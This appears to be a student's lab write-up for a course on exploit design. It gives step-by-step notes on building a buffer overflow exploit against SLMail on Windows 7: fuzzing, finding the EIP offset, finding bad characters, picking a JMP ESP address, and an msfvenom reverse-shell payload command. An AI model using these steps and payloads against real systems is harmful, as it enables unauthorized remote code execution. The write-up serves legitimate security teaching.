						ZEIT8042: Introduction of Exploit Design.
					
					Construct buffer overflow to exploit the system.


			Later, DEP(enabled) environment also exploited by using ROP (Return Oriented Programming)

Environment: 		Kali Linux 2021.2 for attacking machine: 192.168.72.136 | 134
	          	Window 7 SP1: Victim Machine: 192.168.72.137 | 133: 32 bits 


################################################

Step-By-Step Procedure for developing the Shellcode:

###############################################



(1)	./buffer – fuzz.py -> executed (check if EIP could be buffer-overflow or not!)
ESP = 023FA128 … (AAA ….) only ‘A’ send out
EIP = 41414141 (Achieved)

(2)	./buffer – fuzz – pattern.py
ESP = 022EA128 (Dj0Dj1Dj...)

In ID (Immunity Debugger): after attaching the SLMail application.
Kali Linux MC: find pattern_create
	Locate pattern_create
O/P: /user/bin/msf-pattern_create
	/user/share/Metasploit-framework/tools/exploit/pattern_create.rb
Now execute this:
	/user/share/Metasploit-framework/tools/exploit/pattern_create.rb  - l 2700
O/P: Aa0Aa1…
-> Copy this: “(string as buffer…)” and put it in our buffer-fuzz-pattern.py file.
	Run our buffer-fuzz-pattern.py file from Kali M/C when ID is running at Win7 M/C with SLMail application attached. 
	ID “access violation…. [39694438]… found”
	Go back to Kali and find out pattern_offset
Kali: locate pattern_offset
	O/P: /user/bin/msf-pattern_offset
		/user/share/Metasploit-framework/tools/exploit/pattern_offset.rb
	Now run in Kali M/C.
Kali M/C:
/user/share/Metasploit-framework/tools/exploit/pattern_offset.rb – q 39694438
O/P: [*] Exact match at offset 2606

(3)	./buffer-fuzz-offset.py

Buffer = “A” * 2606 + “B” * 4 + “C” * 290  create a 2900 bytes
and check the EIP resistor if it is ‘BBBB’ or ‘42424242’ means our offset is correct.

	Run the program from Kali (./buffer-fuzz-offset.py)
	Run ID in Win7 machine where SLMail is attached with it.
O/P at ID is:
	ESP: full of ‘CCCCCC….’
	EIP: 42424242
	Means OFFSET ‘2606’ is correct to reach EIP resistor.
Now, increase our buffer size to 3500 bytes using more ‘C’  ./buffer-fuzz-C.py

(4)	./buffer-fuzz-badchars.py

We need to find bad characters from the file as it will make the output out of order. For this reason, construct a bad char byte array. It is done from ID in win Win7 M/C
	!mona bytearray 
O/P is bytearray.txt in the ID folder. 
	Copy the byte contexts from bytearray.txt file and create a .py file as buffer-fuzz-badchars.py
	In this file, include the bytearray as variable badchars = …… and ‘buffer’ variable looks like in the following:
Buffer = “A” * 2606 + “B” * 4 + badchars
	Now run this .py from Kali Linux M/C and check this in ID on Win7 M/C after attaching the SLMail application. 
	Now ECX resistor show  illegal command…. AAA… click it and follow in dump. 
O/P: (ECX 025A9ECA ASCII “………. AAAA……”)
	In the DUMP window O/P check the contents after
42 42 42 42 01 02 03 04 05 06 07 08 09 29 20

After 09, it should be 0a 0b… rather 29 20 
So I/P character and O/P character have discrepancies. 
It means OA is bad character.
So remove this from I/P file  means buffer-fuzz-badchar.py file delete the ‘OA’ file from the badchar variable and save it. 
	Do the previous process again and run it.
	And find out ‘\X0D’ has another bad character.
	‘\X00’ also a bad character.
	So from onwards, we have to remember to exclude ‘\X00’, ‘\X0A’ and ‘\X0D’ characters. 

(5)	./buffer-fuzz-C.py (check if EIP’s particular position could be determined)
ESP = 0226A128 (CCCC….)
EIP: 42424242 (Achieved)
(6)	Find the memory address of JMP ESP.
	In the ID: search for >command>JMP ESP (Find Command Windows)
	The OP code for JMP ESP is ‘FFE4’ means “\XFF\XE4”
	Run 
!mona find -s “\XFF\XE4” – m slmfc.dll
	Why is slmfc.dll, why not ntdll.dll?
-	Because .dll module should be ASLR and REBASE false. In case of ntdlll.dlll  both are true.
-	In shellcode execution we need fixed memory address which will not change at this. This is vital for our shellcode executed process.
O/P: 0X5F4A358F
	0X5F4B11E3
…
19 points found.

I choose OX5F4A358F as it has no bad characters and ASLR & REBASE are false. 
	SLMFC.DLL modules.

	Now reconstruct or update our buffer code.
o	In buffer-fuzz-jmp-esp.py file.
Buffer = “A”*2606+”\X8F\X35\X4A\X5F”+”C”*(3500-2606-4)

As we are using Intel machine and it is little endian, addresses are in reverse order. 
	Now run the program ./buffer-fuzz-jmp-esp.py 
Against ID(Win 7 M/C) > SLMail application attached to it.

ESP = 019CA128    ASCII “CCCCC….”
EBP = 41414141
EIP = 019CA2D6

On the stack dump: O/P is 
019CA11C	41414141	AAAA
019CA120	41414141	AAAA
019CA124	5F4A358F	SLMFC.5F4A3585	 A
019CA128	43434343			 B	
019CA12C	43434343

(A)	It is important (0X019CA124) memory location contain string (5F4A358F), which in actually a memory address that stack do not consider. It’s job in when EIP resistor have this input it see whether it is a legitimate address or not? If not ‘access violation’ or jump to that location. When it jump to that location, it found ‘JMP ESP’ instruction or op code of “\XFF\XEA”. 
(B)	To execute the instruction it go to the stack pointer at (0X19CA128) memory location and fetch the contents. If we put our exploit here then it will execute. In many case, “\X90”: NOP (no operation) op code use to direct the shellcode execution location. 
Next the shellcode execution.

(7)	Shellcode execution.

On the Kali Linux M/C execute following command to get the reverse shell of Windows 7 M/C:

	msfvenom -p windows/shell_reverse_tcp LHOST=<attack m/c IP> LPORT=<port#> -f c -a x86 –platform windows -b “\X00\X0A\X0D” -e X86/shikata_ga_nai
	Copy the O/P of this command and put it in the clipboard.



							--Youtube Links--

Buffer Overflow using Shellcode - ZEIT8042: https://www.youtube.com/watch?v=j-K0jX0vgkI&ab_channel=AhasanAnowar

Shellcode Stopped Execution when DEP-Enable - ZEIT8042: https://www.youtube.com/watch?v=datqp0sultA&ab_channel=AhasanAnowar


